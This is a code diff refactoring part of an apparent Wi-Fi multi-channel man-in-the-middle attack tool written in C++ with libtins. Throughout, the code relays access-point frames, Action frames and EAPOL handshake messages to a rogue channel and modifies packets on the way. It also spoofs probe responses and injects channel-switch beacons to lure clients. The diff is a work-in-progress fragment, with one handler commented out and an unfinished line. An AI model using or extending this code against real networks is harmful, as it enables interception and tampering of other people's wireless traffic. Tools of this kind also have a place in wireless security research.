@@ -13,61 +13,62 @@ using namespace chrono;
 using namespace Tins;
 
 void McMitm::handle_from_ap_real(const unique_ptr<PDU> &pdu, const Dot11 &dot11,
-                                 const HWAddress<6> &addr1) {
+                                 const HWAddress<6> &addr1){
     // Beacon from real AP — update timestamp
     if(const auto *b = dot11.find_pdu<Dot11Beacon>()){
         const auto *ch_ie = b->search_option(Dot11ManagementFrame::DS_SET);
         if(ch_ie && ch_ie->data_size() != 0 && ch_ie->data_ptr()[0] == netconfig.real_channel)
             last_real_beacon = steady_clock::now();
-        // return
+        return;
     }
 
     const bool might_forward = clients.contains(addr1) &&
             clients.at(addr1)->should_forward(*pdu);
 
     //print
-    if(dot11.find_pdu<Dot11Deauthentication>() || dot11.find_pdu<Dot11Disassoc>())
-        print_rx(LogLevel::INFO, "Real channel", dot11, might_forward ? " -- MitM'ing" : "");
-    else if(dot11.addr1() == client_mac)
-        display_client_traffic(dot11, "Real channel", might_forward ? " -- MitM'ing" : "");
-    else if(might_forward)
-        print_rx(LogLevel::INFO, "Real channel", dot11, " -- MitM");
+    if(dot11.find_pdu<Dot11Deauthentication>() || dot11.find_pdu<Dot11Disassoc>()){
+        display_traffic(dot11, "Real channel", might_forward ? " -- MitM'ing" : "");
+    } else if(dot11.addr1() == client_mac){
+        display_traffic(dot11, "Real channel", might_forward ? " -- MitM'ing" : "");
+    } else if(might_forward){
+        display_traffic(dot11, "Real channel", " -- MitM ap");
+    }
 
     // Forward na rogue channel
     if(might_forward){
         const auto &client = clients.at(addr1);
         client->modify_packet(*pdu);
-        sock_rogue->send(*pdu, netconfig.rogue_channel);
+        send_to_rogue(*pdu);
     }
 
     if(dot11.find_pdu<Dot11Deauthentication>()) del_client(dot11.addr1());
 }
 
-bool McMitm::handle_action_real(const HWAddress<6> &addr2, PDU &pdu, const Dot11 &dot11) const{
+bool McMitm::handle_action_real(const HWAddress<6> &addr2, PDU &pdu, const std::vector<unsigned char> &raw, const Dot11 &dot11) const{
     if(dot11.type() != Dot11::MANAGEMENT || dot11.subtype() != 13) return false;
     if(dot11.wep()){
         if(addr2 == ap_mac){
-            log(LogLevel::DEBUG, "Real channel: encrypted Action -> rogue channel");
-            sock_rogue->send(pdu, netconfig.rogue_channel);
+            display_traffic(dot11, "Real channel", " -- MitM");
+            send_to_rogue(raw);
+            return true;
         }
-        return true;
     }
 
-    const auto raw = const_cast<Dot11&>(dot11).serialize();
-    if(raw.size() < 25) return false;
-    const uint8_t category = raw[24];
+    const auto serialization = const_cast<Dot11&>(dot11).serialize();
+    if(serialization.size() < 25) return false;
+    const uint8_t category = serialization[24];
 
     if(category == 0){
         log(LogLevel::DEBUG, "Dropping Action frame category=0 (Spectrum Management)");
         return true;
     }
 
-    const HWAddress<6> src(raw.data() + 10);
-    const HWAddress<6> dst(raw.data() + 4);
+    const HWAddress<6> src(serialization.data() + 10);
+    const HWAddress<6> dst(serialization.data() + 4);
 
     if(src == ap_mac && clients.contains(dst)){
         log(LogLevel::DEBUG, "Real channel: Action(cat={}) → rogue channel", category);
-        sock_rogue->send(pdu, netconfig.rogue_channel);
+        send_to_rogue(pdu);
         return true;
     }
     return false;
@@ -79,7 +80,7 @@ bool McMitm::handle_eapol_real(const HWAddress<6> addr1, const HWAddress<6> addr
         if(is_eapol(pdu) /*&& clients.contains(addr1)*/){
             int eapol_msg = get_eapol_msg_num(pdu);
             log(LogLevel::INFO, "Real channel: EAPOL {} from AP ->  rogue channel", eapol_msg);
-            sock_rogue->send(pdu, netconfig.rogue_channel);
+            send_to_rogue(pdu);
             if(eapol_msg == 4 && only_to_mitm) stop_mitm = true;
             return true;
         }
@@ -92,20 +93,20 @@ bool McMitm::handle_probe_real(const HWAddress<6> addr2, const Dot11 &dot11) con
         probe_resp->addr1(dot11.find_pdu<Dot11ProbeRequest>()->addr2());
         RadioTap rt;
         rt.inner_pdu(probe_resp->clone());
-        sock_real->send(rt, netconfig.real_channel);
-        display_client_traffic(dot11, "Real channel", " -- Replied");
+        send_to_real(rt);
+        display_traffic(dot11, "Real channel", " -- Replied");
         return true;
     }
     if(dot11.find_pdu<Dot11ProbeResponse>()){
-        if(addr2 == ap_mac) print_rx(LogLevel::INFO, "Real channel", dot11);
+        if(addr2 == ap_mac) display_traffic(dot11, "Real channel");
         return true;
     }
     return false;
 }
 
-void McMitm::handle_auth_from_client_real(const Dot11Authentication &auth) {
+void McMitm::handle_auth_from_client_real(HWAddress<6> addr1, const Dot11Authentication &auth) {
     const auto client_addr = auth.addr2();
-    print_rx(LogLevel::INFO, "Real channel", auth);
+    display_traffic(auth, "Real channel");
 
     if(client_addr == client_mac)
         log(LogLevel::WARNING, "Client {} is connecting on real channel, injecting CSA beacon to try to correct.",
@@ -120,6 +121,17 @@ void McMitm::handle_auth_from_client_real(const Dot11Authentication &auth) {
     add_client(client);
 }
 
+void McMitm::send_to_real(PDU &pdu) const{ sock_real->send(pdu, netconfig.real_channel); }
+void McMitm::send_to_real(const std::vector<uint8_t> &raw) const{
+    sock_real->send(raw, netconfig.real_channel);
+}
+
+//void McMitm::send_to_real(const std::vector<uint8_t> &raw) const { sock_real->send(, netconfig.real_channel); }
+void McMitm::send_to_rogue(PDU &pdu) const{ sock_rogue->send(pdu, netconfig.rogue_channel); }
+void McMitm::send_to_rogue(const std::vector<uint8_t> &raw) const{
+    sock_rogue->send(raw, netconfig.rogue_channel);
+}
+
 void McMitm::handle_rx_real_chan(const unique_ptr<PDU> &pdu, const vector<uint8_t> &raw){
     auto *dot11 = pdu->find_pdu<Dot11>();
     if(!dot11) return;
@@ -129,22 +141,21 @@ void McMitm::handle_rx_real_chan(const unique_ptr<PDU> &pdu, const vector<uint8_
         return;
     }
 
-
     if (handle_probe_real(addr2, *dot11)) return;
-    if(handle_action_real(addr2, *pdu, *dot11)) return;
-    if(handle_eapol_real(addr1, addr2, *dot11)) return;
+    //TODO if(handle_action_real(addr2, *pdu, raw, *dot11)) return;
+    if(handle_eapol_real(addr2, addr1, *dot11)) return;
 
     if(dot11->addr1() == ap_mac){
         // STA -> AP
         if(const auto *auth = dot11->find_pdu<Dot11Authentication>()){
-            handle_auth_from_client_real(*auth);
-        }else if(dot11->find_pdu<Dot11Deauthentication>() || dot11->find_pdu<Dot11Disassoc>()){
-            print_rx(LogLevel::INFO, "Real channel", *dot11);
+            handle_auth_from_client_real(addr1, *auth);
+        } else if(dot11->find_pdu<Dot11Deauthentication>() || dot11->find_pdu<Dot11Disassoc>()){
+            display_traffic(*dot11, "Real channel");
             del_client(addr2);
         } else if(clients.contains(addr2)){
-            display_client_traffic(*dot11, "Real channel");
+            display_traffic(*dot11, "Real channel");
         } else if(addr2 == client_mac){
-            display_client_traffic(*dot11, "Real channel");
+            display_traffic(*dot11, "Real channel");
         }
 
         // Sleep mode detection
@@ -164,7 +175,7 @@ void McMitm::handle_rx_real_chan(const unique_ptr<PDU> &pdu, const vector<uint8_
     } else if(addr2 == ap_mac){ // AP -> STA
         handle_from_ap_real(pdu, *dot11, addr1);
     } else if(dot11->addr1() == client_mac || addr2 == client_mac){
-        display_client_traffic(*dot11, "Real channel", "_");
+        display_traffic(*dot11, "Real channel", "_");
     }
 }
 }
